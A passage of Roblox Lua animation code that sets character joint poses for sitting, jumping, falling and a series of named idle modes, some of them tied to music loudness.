LW.C0 = LW.C0:lerp(cf(-1.2,1.1,0.5)*angles(math.rad(-148),math.rad(11.5),math.rad(51.6)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.1,1,0.8)*angles(math.rad(-148.7),math.rad(9.6),math.rad(-43.7)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(-14.3),math.rad(-4.9),math.rad(8)),Alpha)
elseif sittingstyle == 5 then
--roblox sit
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(90),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(90),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.5,0)*angles(math.rad(90),math.rad(0),math.rad(0)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.5,0)*angles(math.rad(90),math.rad(0),math.rad(0)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(0),math.rad(0),math.rad(0)),1)
end

elseif RootPart.Velocity.y > 1 and hitfloor == nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then
Anim="Jump"
if attack == false then
if youredead == true then
freefalldeathragdoll()
end
hum.WalkSpeed = storehumanoidWS
 local Alpha = .05
RootJoint.C0 = RootJoint.C0:lerp(cf(0 + 0.1 * math.cos(sine/29),0.4 - 0.1 * math.cos(sine/30),0 + 0.1 * math.cos(sine/31))*angles(math.rad(17.8 + 3 * math.cos(sine/40)),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(-19.7),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.1,-1)*angles(math.rad(-34.2),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.5,0.4)*angles(math.rad(-17.1 -3 * math.cos(sine/40)),math.rad(29.5),math.rad(-13.8 - 3 * math.cos(sine/30))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.5,0.4)*angles(math.rad(-19.4 - 3 * math.cos(sine/40)),math.rad(-22.3),math.rad(11.3 + 3 * math.cos(sine/30))),Alpha)
Torso.Neck.C0=Torso.Neck.C0:lerp(necko*angles(math.rad(-20 - 5 * math.cos(sine/60)),math.rad(0),math.rad(0)),.05)
end
elseif RootPart.Velocity.y < -1 and freefall < 252 and hitfloor==nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then 
Anim="Fall"
if attack==false then
if youredead == true then
freefalldeathragdoll()
end
freefall = freefall + 1
--print(freefall)
hum.WalkSpeed = storehumanoidWS
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0.4 + tors.Velocity.Y/300,0)*angles(math.rad(-17.4),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(22.7),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,0.1,-0.5)*angles(math.rad(11.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.6,0.3)*angles(math.rad(104.4 +tors.Velocity.Y/8),math.rad(20.1 +tors.Velocity.Y/8),math.rad(-81.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.4,0.4)*angles(math.rad(89 +tors.Velocity.Y/8),math.rad(-26.7 -tors.Velocity.Y/8),math.rad(90.7)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.1,0.3)*angles(math.rad(-18.4),math.rad(0),math.rad(0))*necko,Alpha)
end
elseif RootPart.Velocity.y < -1 and freefall > 350 and hitfloor==nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then
Anim="FreeFall2"
chaeng = 1
if attack==false then

if heckfallnum == 1 then
local Alpha = .02
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-123.8 + 5 * math.cos(sine/70)),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.3,-0.7)*angles(math.rad(-14.3 - 5 * math.cos(sine/80)),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1.1,0.1)*angles(math.rad(-32 - 5 * math.cos(sine/80)),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.3,0.4)*angles(math.rad(-28.5 - 10 * math.cos(sine/51)),math.rad(28.3),math.rad(-11.5)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.3,0.4)*angles(math.rad(-35.2 - 10 * math.cos(sine/50)),math.rad(-23.3),math.rad(0)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0,-0.3)*angles(math.rad(14.8),math.rad(-4.7),math.rad(0.1))*necko,Alpha)
elseif heckfallnum == 2 then
youredead = true
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(100.1 - 30 * math.cos(sine/34)),math.rad(17 - 30 * math.cos(sine/52)),math.rad(18.7- 30 * math.cos(sine/83)))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(42.1 + 10 * math.cos(sine/10)),math.rad(22.4),math.rad(-24.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(63- 10 * math.cos(sine/11)),math.rad(29.1),math.rad(32))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.8,1,-0.5)*angles(math.rad(46.2+ 20 * math.cos(sine/22)),math.rad(-48.4),math.rad(-62.3+ 20 * math.cos(sine/57))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.7,0.1,-0.4)*angles(math.rad(90.9- 20 * math.cos(sine/36)),math.rad(-31.6),math.rad(32.7- 20 * math.cos(sine/59))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(22.8),math.rad(-10),math.rad(-10.1)),Alpha)
end
end
elseif RootPart.Velocity.y < -1 and freefall > 250 and freefall <355 and hitfloor==nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then
Anim="FreeFall1"
chaeng = 1
freefall = freefall + 0.1
--print(freefall)
if attack == false then
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-78.1 + 10 * math.cos(sine/50)),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0.2)*angles(math.rad(-33.5 - 10 * math.cos(sine/81)),math.rad(6.2),math.rad(-20.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1.3,0.1)*angles(math.rad(-34.1 + 10 * math.cos(sine/80)),math.rad(-4),math.rad(24.4))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.6,1.1,-0.2)*angles(math.rad(102.3 + 10 * math.cos(sine/30)),math.rad(-41.2),math.rad(-68.5)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.8,0)*angles(math.rad(95.2 - 10 * math.cos(sine/70)),math.rad(38),math.rad(72)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0,-0.2)*angles(math.rad(13.8),math.rad(-4.7),math.rad(0))*necko,Alpha)
end
elseif torvel < 1 and hitfloor ~= nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then
Anim = "Idle"
if attack == false then
if youredead == true then
freefalldeathragdoll()
end
if tired == false then
hum.WalkSpeed = storehumanoidWS
if ModeOfCharacter == "Exasperation" then
if APEXRARE == true then
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0.1,0.1,0)*angles(math.rad(0),math.rad(-43.3),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.1,-1.1,0.1)*angles(math.rad(0),math.rad(41.4),math.rad(-5.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.1,-1.2,-0.3)*angles(math.rad(12.3),math.rad(-18.4),math.rad(8.2))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.6,-0.3,-0.4)*angles(math.rad(135.1),math.rad(13.9),math.rad(26.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0.2)*angles(math.rad(34),math.rad(-24.2),math.rad(18)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(0.5),math.rad(-0.2),math.rad(47)),Alpha)
else

local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 - .15 * math.sin(sine/40),0)*angles(math.rad(12.3),math.rad(44.3),math.rad(-8.6))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1+.15 * math.sin(sine/40),0)*angles(math.rad(-11.4),math.rad(8.9),math.rad(-9.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1+.15 * math.sin(sine/40),0)*angles(math.rad(-15.6),math.rad(-33.9),math.rad(6.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.3+.1 * math.cos(sine/40),0.2)*angles(math.rad(8.3),math.rad(25.8),math.rad(-22)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2+.1 * math.cos(sine/40),0.4)*angles(math.rad(-5.8),math.rad(-32.8),math.rad(18.9)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(17.9 +5 * math.cos(sine/40) + math.random(-2,2)),math.rad(-6.4+ math.random(-2,2)),math.rad(-38.5+ math.random(-2,2))),.2)
end
elseif ModeOfCharacter == "Serene" then
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + .1 * math.cos(sine/30),0)*angles(math.rad(6.6 +3 * math.sin(sine/30)),math.rad(3.2),math.rad(2.1))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.1,-1.1-.1 * math.cos(sine/30),-0.5)*angles(math.rad(-6.2-3 * math.sin(sine/30)),math.rad(8),math.rad(-10.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1-.1 * math.cos(sine/30),0)*angles(math.rad(-15.6-3 * math.sin(sine/30)),math.rad(-33.9),math.rad(6.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.7,0+.1 * math.sin(sine/30),-0.5)*angles(math.rad(89.8 +5 * math.sin(sine/40)),math.rad(-0.3 -4 * math.sin(sine/42)),math.rad(90.1)),Alpha)
RW.C0 = RW.C0:lerp(cf(0.6,0.2+.1 * math.sin(sine/30),-0.7)*angles(math.rad(89.6 +5 * math.sin(sine/40)),math.rad(-12.2 +4 * math.sin(sine/41)),math.rad(-72.7)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(14.1 +4 * math.cos(sine/31)),math.rad(-5),math.rad(-2)),Alpha)
elseif ModeOfCharacter == "Hostility" then
local Alpha = .25
RootJoint.C0 = RootJoint.C0:lerp(cf(0,-0.2 +.05 * math.cos(sine/12.5),-0.1)*angles(math.rad(-23.1 + 5 * math.sin(sine/12.5)),math.rad(-5.9),math.rad(-2.5))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.7-.05 * math.cos(sine/12.5),-0.5)*angles(math.rad(34.6 - 5 * math.sin(sine/12.5)),math.rad(6.1),math.rad(-1.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1-.05 * math.cos(sine/12.5),-0.4)*angles(math.rad(-13.9 - 5 * math.sin(sine/12.5)),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1,1,-1)*angles(math.rad(150.7+math.random(-6,6)),math.rad(60.7+math.random(-6,6)),math.rad(41.9+math.random(-6,6))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.1,0.1,0.6)*angles(math.rad(-55.3+math.random(-6,6)),math.rad(-55.5+math.random(-6,6)),math.rad(-40.8+math.random(-6,6))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(-14.8+5 * math.cos(sine/25)+1*math.cos(sine/0.1)),math.rad(-6+1*math.cos(sine/0.2)),math.rad(6.3+1*math.cos(sine/0.3))),.5)
elseif ModeOfCharacter == "Unrestrained" then
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,1.5 + .5 * math.cos(sine/40),0)*angles(math.rad(81.5 - 7 * math.sin(sine/40)),math.rad(6.1),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.9,0)*angles(math.rad(-12.6 - 4 * math.sin(sine/41)),math.rad(-2.1),math.rad(9.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.8,-0.8,-0.3)*angles(math.rad(36.7 - 4 * math.sin(sine/41)),math.rad(15.1),math.rad(-20.4))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.9,1.1,0.4)*angles(math.rad(-146.5),math.rad(-8.8 - 7 * math.sin(sine/30)),math.rad(57.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(0.9,1.3,0.7)*angles(math.rad(-166),math.rad(12.4 - 7 * math.cos(sine/35)),math.rad(-45.3)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(7.5 - 4 * math.cos(sine/70)),math.rad(-1.7),math.rad(-13.3)),Alpha)
elseif ModeOfCharacter == "Exstatic" then
local Alpha = .1+DerpzMusic.PlaybackLoudness/1000
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + .1*math.cos(sine/20),0)*angles(math.rad(-6.1 - 2 * math.sin(sine/20)),math.rad(-40.4),math.rad(-4))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-1 - .1*math.cos(sine/20),0)*angles(math.rad(10.3 + 2 * math.sin(sine/20)),math.rad(27.4),math.rad(-4.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1 - .1*math.cos(sine/20),0)*angles(math.rad(1.7 + 2 * math.sin(sine/20)),math.rad(-16.4),math.rad(11.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.6,0.3,0)*angles(math.rad(-0.7),math.rad(-23.7 - 3 * math.cos(sine/40)),math.rad(-10.1+ 3 * math.cos(sine/40))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0.3,-0.1)*angles(math.rad(-3.8),math.rad(14.8 + 3 * math.sin(sine/40)),math.rad(14.5 - 3 * math.cos(sine/40))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(9.4 - 4 * math.cos(sine/42)+DerpzMusic.PlaybackLoudness/100),math.rad(8.4),math.rad(43.5)),.4)
elseif ModeOfCharacter == "Inexplicable" then
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,1.2 + .3 * math.cos(sine/20),0)*angles(math.rad(20.1 + 3 * math.cos(sine/21)),math.rad(-18.5),math.rad(1.4))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.2,-0.1)*angles(math.rad(-25 - 4 * math.cos(sine/21)),math.rad(-7.7),math.rad(-1.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.9,-0.3,-0.7)*angles(math.rad(-35.5 - 4 * math.cos(sine/21)),math.rad(-30),math.rad(8.7))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.1,0.5)*angles(math.rad(-23.7),math.rad(5.1 + 5 * math.cos(sine/20)),math.rad(1 - 5 * math.sin(sine/20))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0.2,0.1)*angles(math.rad(-16.9),math.rad(-3.7 - 5 * math.cos(sine/20)),math.rad(12.1 + 5 * math.sin(sine/20))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(21.4 + 3 * math.sin(sine/21)),math.rad(11 + 7 * math.cos(sine/21)),math.rad(16.5 + 2 * math.sin(sine/20))),Alpha)
elseif ModeOfCharacter == "Demented" then
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + .1 * math.cos(sine/20),0)*angles(math.rad(-15 - 4 * math.sin(sine/30)),math.rad(-13.9),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.1,-0.9 - .1 * math.cos(sine/20),-0.3)*angles(math.rad(18.8+ 4 * math.sin(sine/30)),math.rad(11.8),math.rad(-6.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1.3 - .1 * math.cos(sine/20),-0.5)*angles(math.rad(-25.7+ 4 * math.sin(sine/30)),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.4 - .05 * math.sin(sine/20),-0.2)*angles(math.rad(-12.4 + 6 * math.sin(sine/20)+math.random(-4,4)),math.rad(-24.5 - 2 * math.cos(sine/20)+math.random(-4,4)),math.rad(-22.4+math.random(-4,4))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0.2 - .05 * math.sin(sine/20),-0.2)*angles(math.rad(-7.8 + 6 * math.sin(sine/20)+math.random(-4,4)),math.rad(24.3 + 2 * math.cos(sine/20)+math.random(-4,4)),math.rad(18.4+math.random(-4,4))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(25.6 - 6 * math.cos(sine/80)+math.random(-4,4)),math.rad(7.8+math.random(-4,4)),math.rad(16.6+math.random(-4,4))),Alpha)
elseif ModeOfCharacter == "Demented+" then
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0,-0.5 + .1 * math.cos(sine/20),0)*angles(math.rad(-19.9 + 2 * math.sin(sine/20)),math.rad(17.4),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-0.8,-0.3 - .1 * math.cos(sine/20),-0.8)*angles(math.rad(19.9 - 2 * math.sin(sine/20)),math.rad(-14.3),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.2,-1.5 - .1 * math.cos(sine/20),-0.4)*angles(math.rad(-51 - 2 * math.sin(sine/20)),math.rad(-18.4),math.rad(-18.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.8,0.7,-0.7)*angles(math.rad(133.9+math.random(-4,4)),math.rad(49.1+math.random(-4,4)),math.rad(34.6+math.random(-4,4))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,-0.2)*angles(math.rad(5.6+math.random(-4,4)),math.rad(30.5+math.random(-4,4)),math.rad(15.1+10 * math.cos(sine/11)+math.random(-4,4))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(10 + 5 * math.cos(sine/35)+math.random(-4,4)),math.rad(2.7+math.random(-4,4)),math.rad(-11.1+math.random(-4,4))),Alpha)
elseif ModeOfCharacter == "Atmospherical" then
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,2.1 + 1 * math.cos(sine/30),0)*angles(math.rad(15.9 - 3.5 * math.cos(sine/40)),math.rad(-33),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-0.9,-1.1 + .1 * math.cos(sine/31),0.1)*angles(math.rad(14+3.5 * math.cos(sine/40)),math.rad(32.9),math.rad(-0.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.5,-0.8)*angles(math.rad(-43.2),math.rad(-24.5+3.5 * math.cos(sine/40)),math.rad(10.2))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.6,-0.5,0.2)*angles(math.rad(133+ 3 * math.cos(sine/32)),math.rad(26.5),math.rad(-1.8)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0.1,-0.2)*angles(math.rad(-29.5 + 5 * math.sin(sine/31)),math.rad(30.5),math.rad(32.5 + 10 * math.cos(sine/70))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(34.2 + 4 * math.sin(sine/30)),math.rad(3),math.rad(39.3)),Alpha)
elseif ModeOfCharacter == "Herculean" then
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,2.3 + 1.3*math.cos(sine/56),0)*angles(math.rad(21.1),math.rad(21.7),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(32.5 + 6*math.sin(sine/56)),math.rad(-5.4),math.rad(-8.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.1,-0.6,-0.9)*angles(math.rad(-56.9- 6*math.sin(sine/56)),math.rad(-18),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.7,0.1 - .05 * math.cos(sine/50),-0.8)*angles(math.rad(121.5 +2*math.sin(sine/65)),math.rad(3.8),math.rad(93.5 + 7*math.cos(sine/63))),Alpha)
RW.C0 = RW.C0:lerp(cf(0.7,0.3 - .05 * math.cos(sine/50),-0.6)*angles(math.rad(136.8+2*math.cos(sine/65)),math.rad(0.8),math.rad(-89.8 -4*math.cos(sine/64))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(27.7+5*math.cos(sine/45)),math.rad(3*math.sin(sine/45)),math.rad(-24.9)),Alpha)
elseif ModeOfCharacter == "Resolute" then
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0.5*math.cos(sine/55),1.5 - .5 * math.cos(sine/35),0.5*math.sin(sine/54))*angles(math.rad(14),math.rad(-17.3),math.rad(4.1))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-0.4,-1)*angles(math.rad(-40.6 - 5 * math.cos(sine/36)),math.rad(21.8),math.rad(-0.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.9,-0.1)*angles(math.rad(10.8 + 5 * math.cos(sine/36)),math.rad(-2.7),math.rad(10.5))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1,0.8 - .05 * math.cos(sine/40),0.4)*angles(math.rad(-79.4),math.rad(-44.8 + 7 * math.cos(sine/53)),math.rad(106.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.1 + .05 * math.sin(sine/40),0)*angles(math.rad(-22.2 + 10 * math.cos(sine/23)),math.rad(38.1 - 15 * math.cos(sine/34)),math.rad(4.5)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(30.4 - 3 * math.sin(sine/35)),math.rad(-3.9 * math.sin(sine/70)),math.rad(23.7)),Alpha)
elseif ModeOfCharacter == "Determined" then
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + .2 * math.cos(sine/20),0)*angles(math.rad(0 + 1 * math.sin(sine/20)),math.rad(-52.8),math.rad(-11.5))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.1,-1.3-.2 * math.cos(sine/20),-0.1)*angles(math.rad(-10 - 1 * math.sin(sine/20)),math.rad(55.1),math.rad(11.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.1,-0.9-.2 * math.cos(sine/20),-0.3)*angles(math.rad(1.1 - 1 * math.sin(sine/20)),math.rad(-22.3),math.rad(21.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,1.3,0.5)*angles(math.rad(159.1 + 5 * math.cos(sine/23)),math.rad(-37.1),math.rad(-31.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.4,0.3)*angles(math.rad(17),math.rad(-7.9),math.rad(21.3)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(28.6 - 2 * math.cos(sine/41)),math.rad(21.3+5*math.sin(sine/40)),math.rad(45.5)),Alpha)
elseif ModeOfCharacter == "Despondency" then
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + .1 * math.cos(sine/65),0)*angles(math.rad(-26.2),math.rad(5.4),math.rad(2.6))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-0.9,-0.7 - .1 * math.cos(sine/65),-0.9)*angles(math.rad(24.4),math.rad(-10.3),math.rad(-0.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.1,-1.1 - .1 * math.cos(sine/65),-0.6)*angles(math.rad(-15),math.rad(-8.3),math.rad(-7.2))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.3,0.3 + .1 * math.sin(sine/65),-0.5)*angles(math.rad(27.9),math.rad(-22.9),math.rad(0)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.2 + .1 * math.sin(sine/65),-0.4)*angles(math.rad(22.1),math.rad(22.4),math.rad(0.9)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(36.2 - 3 * math.sin(sine/80)),math.rad(4.4),math.rad(-6 + 10 * math.cos(sine/40))),Alpha)
elseif ModeOfCharacter == "Varicolored" then
if DerpzMusic.PlaybackLoudness < 650 then
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 - .1 * math.cos(sine/10),0)*angles(math.rad(0 + 1 * math.cos(sine/20)),math.rad(24.3),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.1,-1 +.1 * math.cos(sine/10),-0.3)*angles(math.rad(4.8 -2 * math.cos(sine/20)),math.rad(23.1),math.rad(-8.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1 +.1 * math.cos(sine/10),0)*angles(math.rad(0 -2 * math.cos(sine/20)),math.rad(-26.3),math.rad(1.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.3 + .15 * math.sin(sine/10),0.3 - DerpzMusic.PlaybackLoudness/1000)*angles(math.rad(20 + DerpzMusic.PlaybackLoudness/5),math.rad(42.7),math.rad(-13.1)),.15)
RW.C0 = RW.C0:lerp(cf(1.4,0.2 + .15 * math.sin(sine/10),-0.1)*angles(math.rad(3 + 1 * math.sin(sine/10)),math.rad(13),math.rad(-12.9)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(12.7 + 5 * math.sin(sine/10)),math.rad(-0.9),math.rad(-25.6)),Alpha)
elseif DerpzMusic.PlaybackLoudness > 650 then
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 - .15 * math.sin(sine/5),0)*angles(math.rad(-27.4 + 2 * math.cos(sine/10)),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-0.9 + .15 * math.sin(sine/5),-0.5)*angles(math.rad(22.8 - 2 * math.cos(sine/10)),math.rad(24.1),math.rad(-14.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.9 + .15 * math.sin(sine/5),-0.8)*angles(math.rad(34.5 - 2 * math.cos(sine/10)),math.rad(-11.9),math.rad(9))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.3,0.1 + .05 * math.cos(sine/5),-0.8)*angles(math.rad(174.5 + 3 * math.cos(sine/5)),math.rad(-19.6),math.rad(2.9)),Alpha)
